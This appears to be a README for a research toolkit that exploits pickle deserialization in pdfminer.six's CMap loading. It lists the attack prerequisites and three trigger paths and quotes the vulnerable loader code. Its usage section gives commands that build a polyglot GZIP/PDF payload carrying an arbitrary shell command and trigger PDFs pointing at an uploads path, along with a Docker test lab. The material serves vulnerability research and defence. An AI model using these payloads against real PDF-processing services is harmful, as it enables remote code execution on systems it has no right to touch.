# Pdfminer CMap Generator

A security research toolkit for analyzing pickle deserialization vulnerabilities in pdfminer.six through CMap resource loading mechanisms.

## Vulnerability Summary

**Background**

- pdfminer.six <= ALL（Until 2025.10.27）

**Exploitation Requirements:**

- Malicious PDF and GZIP upload capability
- Application process PDF with pdfminer.six
- Attacker-controlled `.pickle.gz` file accessible at predictable path
- Knowledge of target filesystem structure

## Technical Details

**Vulnerability Forms:**

1. ToUnicode usecmap
   - Works with any font type (Type0/Type1/TrueType)
   - Uses `/ToUnicode` stream with `usecmap` instruction referencing absolute path to `.pickle.gz` file
2. Type0 Font Encoding
   - Requires Type0 font with `/Encoding` field containing absolute path to `.pickle.gz` file
3. XObject Path Traversal
   - Limited impact due to forced file extensions

The vulnerability of CMapDB lies in `pdfminer/cmapdb.py:33`:

```
def _load_data(cls, name: str) -> Any:
    name = name.replace("\0", "")
    filename = "%s.pickle.gz" % name
    for directory in cmap_paths:
        path = os.path.join(directory, filename)
        if os.path.exists(path):
            gzfile = gzip.open(path)
            return type(str(name), (), pickle.loads(gzfile.read()))
```

Complete call chains and technical analysis available in:

- [English Research Document](https://github.com/L1nq0/Pdfminer-CMap-Generator/blob/master/research/Pdfminer-Vulnerability-Research_EN.md)
- [Chinese Research Document](https://github.com/L1nq0/Pdfminer-CMap-Generator/blob/master/research/Pdfminer-Vulnerability-Research.md)

## Usage

### Installation

```
cd src/ && pip install -r requirements.txt
```

### Generating Polyglot GZIP/PDF Payload

```
python src/pcg.py build -t gzip -p "echo 123 > 1.txt"
```

### Generating Trigger PDF

```
python src/pcg.py build -t pdf -ptt encoding -ep "/proc/self/cwd/uploads/payload"
python src/pcg.py build -t pdf -ptt traversal -ep "/proc/self/cwd/uploads/payload"
```

## Environment

Docker testing environment is provided in `research/lab/pdf2text_debug/`

```
cd research/lab/pdf2text_debug
docker-compose up --build

# Access at http://localhost:11452
# Debug endpoints: /_dbg/trace, /_dbg/openlog, /_dbg/head
```

The environment includes:

- Flask application with PDF upload endpoint
- Monkey-patched `pickle.loads()` for deserialization logging

## References

https://github.com/un1novvn

https://github.com/pdfminer/pdfminer.six

https://blog.wm-team.cn/index.php/archives/86/

https://www.cnblogs.com/L1nq/p/19124085
